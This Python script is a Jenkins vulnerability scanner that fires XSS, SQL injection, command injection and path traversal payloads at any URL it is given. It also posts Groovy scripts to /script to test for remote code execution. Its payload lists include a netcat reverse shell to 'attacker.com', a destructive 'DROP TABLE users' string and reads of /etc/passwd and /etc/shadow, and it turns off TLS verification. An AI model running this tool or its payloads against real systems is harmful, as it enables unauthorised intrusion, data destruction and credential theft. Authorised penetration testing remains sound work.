#!/usr/bin/env python3
import requests
import re
import sys
import json
from urllib.parse import urljoin, parse_qs, urlparse
from collections import defaultdict
import warnings

warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class JenkinsPentester:
    def __init__(self, jenkins_url, log_file=None, ua="pentest/1.0"):
        self.jenkins_url = jenkins_url.rstrip('/')
        self.log_file = log_file
        self.session = requests.Session()
        self.session.verify = False
        self.results = defaultdict(list)
        self.ua = ua
        self.session.headers.update({'User-Agent': self.ua})
        # XSS payloads
        self.xss_payloads = [
            '"><script>alert(1)</script>',
            '" onload="alert(1)"',
            "' onload='alert(1)'",
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            'javascript:alert(1)',
            '<iframe src=javascript:alert(1)>',
            '<body onload=alert(1)>',
            '${alert(1)}',
            '#{alert(1)}',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '"><style>@import"http://attacker.com"</style>',
            '<svg/onload=alert(1)>',
            '<img src=x:alert(String.fromCharCode(88,83,83))>',
            '</title><img src=x onerror=alert(1)>',
            '<script>/**/alert(1)</script>',
            '<img src=x alt=x title=x onerror="/**/alert(1)//">',
        ]
        
        # SQLi payloads
        self.sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 'a'='a",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 999--",
            "'; DROP TABLE users--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND SLEEP(5)--",
            "' AND 1=SLEEP(5)--",
            "1' AND '1'='1",
            "' UNION ALL SELECT NULL--",
        ]
        
        # Command injection payloads
        self.cmd_payloads = [
            '; id',
            '| id',
            '| whoami',
            '`id`',
            '$(id)',
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '; ls -la',
            '| nc -e /bin/sh attacker.com 4444',
            '`whoami`',
            '$(whoami)',
        ]
        
        # Path traversal payloads
        self.path_traversal_payloads = [
            '../../etc/passwd',
            '../../../../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '....//....//etc/shadow',
            '%2e%2e/etc/passwd',
            '..;/etc/passwd',
        ]
        
        # Jenkins-specific endpoints and methods
        self.jenkins_endpoints = [
            '/api/json',
            '/api/xml',
            '/queue/api/json',
            '/createItem',
            '/job',
            '/view',
            '/manage',
            '/admin',
            '/configure',
            '/script',
            '/test',
            '/search',
            '/checkJobName',
        ]
        
    def parse_access_log(self):
        """Parse Jenkins access log to extract endpoints"""
        endpoints = defaultdict(int)
        if not self.log_file:
            return endpoints
            
        try:
            with open(self.log_file, 'r') as f:
                for line in f:
                    match = re.search(r'"(\w+)\s+([^\s"]+)\s+HTTP', line)
                    if match:
                        method, path = match.groups()
                        path = path.split('?')[0]
                        endpoints[path] += 1
            return dict(sorted(endpoints.items(), key=lambda x: x[1], reverse=True))
        except:
            return endpoints
    
    def test_xss(self, endpoint, method='GET', param_name='q'):
        """Test endpoint for XSS vulnerabilities"""
        vulnerabilities = []
        
        for payload in self.xss_payloads:
            params = {param_name: payload}
            try:
                if method == 'GET':
                    resp = self.session.get(f"{self.jenkins_url}{endpoint}", params=params, timeout=5)
                else:
                    resp = self.session.post(f"{self.jenkins_url}{endpoint}", data=params, timeout=5)
                
                if payload.lower() in resp.text.lower() and resp.status_code < 400:
                    vulnerabilities.append({
                        'type': 'XSS',
                        'endpoint': endpoint,
                        'payload': payload,
                        'status': resp.status_code,
                        'reflected': True
                    })
            except:
                pass
        
        return vulnerabilities
    
    def test_sqli(self, endpoint, method='GET', param_name='q'):
        """Test endpoint for SQL injection"""
        vulnerabilities = []
        
        for payload in self.sqli_payloads:
            params = {param_name: payload}
            try:
                if method == 'GET':
                    resp = self.session.get(f"{self.jenkins_url}{endpoint}", params=params, timeout=5)
                else:
                    resp = self.session.post(f"{self.jenkins_url}{endpoint}", data=params, timeout=5)
                
                # Check for SQLi indicators
                error_patterns = [
                    r"SQL syntax",
                    r"SQLException",
                    r"mysql_fetch",
                    r"Warning.*mysql",
                    r"ORA-\d+",
                    r"PostgreSQL.*error",
                    r"You have an error in your SQL",
                ]
                
                if any(re.search(pattern, resp.text, re.I) for pattern in error_patterns):
                    vulnerabilities.append({
                        'type': 'SQLI',
                        'endpoint': endpoint,
                        'payload': payload,
                        'status': resp.status_code,
                        'error_revealed': True
                    })
                    
                # Time-based SQLi detection
                import time
                start = time.time()
                params_delayed = {param_name: "1' AND SLEEP(3)--"}
                resp = self.session.get(f"{self.jenkins_url}{endpoint}", params=params_delayed, timeout=10)
                elapsed = time.time() - start
                
                if elapsed > 2.5:
                    vulnerabilities.append({
                        'type': 'SQLI_TIME_BASED',
                        'endpoint': endpoint,
                        'payload': params_delayed[param_name],
                        'status': resp.status_code,
                        'response_time': elapsed
                    })
            except:
                pass
        
        return vulnerabilities
    
    def test_cmd_injection(self, endpoint, method='GET', param_name='cmd'):
        """Test endpoint for command injection"""
        vulnerabilities = []
        
        for payload in self.cmd_payloads:
            params = {param_name: payload}
            try:
                if method == 'GET':
                    resp = self.session.get(f"{self.jenkins_url}{endpoint}", params=params, timeout=5)
                else:
                    resp = self.session.post(f"{self.jenkins_url}{endpoint}", data=params, timeout=5)
                
                # Check for command output
                cmd_indicators = [r'uid=\d+', r'root:', r'nologin', r'total \d+', r'drwx']
                
                if any(re.search(indicator, resp.text) for indicator in cmd_indicators):
                    vulnerabilities.append({
                        'type': 'COMMAND_INJECTION',
                        'endpoint': endpoint,
                        'payload': payload,
                        'status': resp.status_code,
                        'command_output': True
                    })
            except:
                pass
        
        return vulnerabilities
    
    def test_path_traversal(self, endpoint):
        """Test endpoint for path traversal"""
        vulnerabilities = []
        
        for payload in self.path_traversal_payloads:
            try:
                urls = [
                    f"{self.jenkins_url}{endpoint}?file={payload}",
                    f"{self.jenkins_url}{endpoint}/{payload}",
                    f"{self.jenkins_url}/userContent/{payload}",
                ]
                
                for url in urls:
                    resp = self.session.get(url, timeout=5)
                    
                    if resp.status_code == 200 and ('root:' in resp.text or 'WIN' in resp.text or '[boot]' in resp.text):
                        vulnerabilities.append({
                            'type': 'PATH_TRAVERSAL',
                            'endpoint': endpoint,
                            'url': url,
                            'status': resp.status_code,
                            'file_disclosed': True
                        })
            except:
                pass
        
        return vulnerabilities
    
    def test_jenkins_specific(self):
        """Test Jenkins-specific vulnerabilities"""
        vulnerabilities = []
        
        # Test /script endpoint for RCE (Groovy)
        groovy_payloads = [
            'def proc = "id".execute(); println proc.text',
            'println "id".execute().text',
            '@Grab("net.sf.json-lib:json-lib:2.4:jdk15") def obj = new Object(); println obj',
        ]
        
        for payload in groovy_payloads:
            try:
                data = {'script': payload}
                resp = self.session.post(f"{self.jenkins_url}/script", data=data, timeout=5)
                
                if 'uid=' in resp.text or 'command not found' in resp.text:
                    vulnerabilities.append({
                        'type': 'JENKINS_GROOVY_RCE',
                        'endpoint': '/script',
                        'payload': payload,
                        'status': resp.status_code,
                        'rce': True
                    })
            except:
                pass
        
        # Test /api/json endpoint
        try:
            resp = self.session.get(f"{self.jenkins_url}/api/json", timeout=5)
            if resp.status_code == 200 and 'jobs' in resp.text:
                vulnerabilities.append({
                    'type': 'INFO_DISCLOSURE',
                    'endpoint': '/api/json',
                    'description': 'Jenkins API accessible without authentication',
                    'status': resp.status_code
                })
        except:
            pass
        
        # Test /admin endpoint access
        try:
            resp = self.session.get(f"{self.jenkins_url}/admin", allow_redirects=False, timeout=5)
            if resp.status_code != 403:
                vulnerabilities.append({
                    'type': 'UNAUTHORIZED_ACCESS',
                    'endpoint': '/admin',
                    'status': resp.status_code,
                    'description': 'Admin endpoint accessible'
                })
        except:
            pass
        
        return vulnerabilities
    
    def test_endpoint(self, endpoint, methods=['GET', 'POST']):
        """Test an endpoint for all vulnerability types"""
        all_vulns = []
        
        for method in methods:
            # Test various parameter names
            param_names = ['q', 'search', 'name', 'value', 'param', 'input', 'query', 'id', 'file', 'path']
            
            for param in param_names:
                all_vulns.extend(self.test_xss(endpoint, method, param))
                all_vulns.extend(self.test_sqli(endpoint, method, param))
                all_vulns.extend(self.test_cmd_injection(endpoint, method, param))
        
        all_vulns.extend(self.test_path_traversal(endpoint))
        
        return all_vulns
    
    def run(self, endpoints_to_test=None):
        """Run full pentest"""
        print(f"[*] Starting Jenkins Pentest against {self.jenkins_url}")
        
        # Get endpoints from log or use provided list
        if endpoints_to_test:
            endpoints = endpoints_to_test
        elif self.log_file:
            print(f"[*] Parsing access log: {self.log_file}")
            endpoints = self.parse_access_log()
            endpoints = list(endpoints.keys())[:20]  # Limit to top 20
        else:
            endpoints = self.jenkins_endpoints
        
        print(f"[*] Testing {len(endpoints)} endpoints")
        
        # Test each endpoint
        for i, endpoint in enumerate(endpoints):
            print(f"[*] Testing {endpoint} ({i+1}/{len(endpoints)})")
            
            vulns = self.test_endpoint(endpoint)
            
            if vulns:
                self.results[endpoint] = vulns
                print(f"    [!] Found {len(vulns)} vulnerabilities")
        
        # Test Jenkins-specific attacks
        print("[*] Testing Jenkins-specific vectors")
        jenkins_vulns = self.test_jenkins_specific()
        if jenkins_vulns:
            for vuln in jenkins_vulns:
                endpoint = vuln.get('endpoint', 'jenkins-specific')
                if endpoint not in self.results:
                    self.results[endpoint] = []
                self.results[endpoint].append(vuln)
        
        return self.results
    
    def report(self):
        """Print vulnerability report"""
        print("\n" + "="*70)
        print("JENKINS PENTEST REPORT")
        print("="*70)
        
        if not self.results:
            print("[+] No vulnerabilities found")
            return
        
        total_vulns = sum(len(v) for v in self.results.values())
        print(f"\n[!] Found {total_vulns} vulnerabilities in {len(self.results)} endpoints\n")
        
        for endpoint, vulns in sorted(self.results.items()):
            print(f"\n[ENDPOINT] {endpoint}")
            print("-" * 70)
            
            for vuln in vulns:
                vuln_type = vuln.get('type', 'UNKNOWN')
                status = vuln.get('status', 'N/A')
                
                print(f"  Type: {vuln_type}")
                print(f"  Status Code: {status}")
                
                if 'payload' in vuln:
                    print(f"  Payload: {vuln['payload'][:60]}")
                
                if 'description' in vuln:
                    print(f"  Description: {vuln['description']}")
                
                if 'response_time' in vuln:
                    print(f"  Response Time: {vuln['response_time']:.2f}s")
                
                print()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <jenkins_url> [log_file] [endpoint1,endpoint2,...]")
        print(f"Example: python3 {sys.argv[0]} http://localhost:8080")
        print(f"Example: python3 {sys.argv[0]} http://localhost:8080 /var/log/jenkins/access.log")
        sys.exit(1)
    
    jenkins_url = sys.argv[1]
    log_file = sys.argv[2] if len(sys.argv) > 2 else None
    endpoints = sys.argv[3].split(',') if len(sys.argv) > 3 else None
    
    pentester = JenkinsPentester(jenkins_url, log_file)
    results = pentester.run(endpoints)
    pentester.report()
    
    # Export JSON
    with open('jenkins_pentest_results.json', 'w') as f:
        json.dump(dict(pentester.results), f, indent=2, default=str)
    print(f"\n[+] Results saved to jenkins_pentest_results.json")
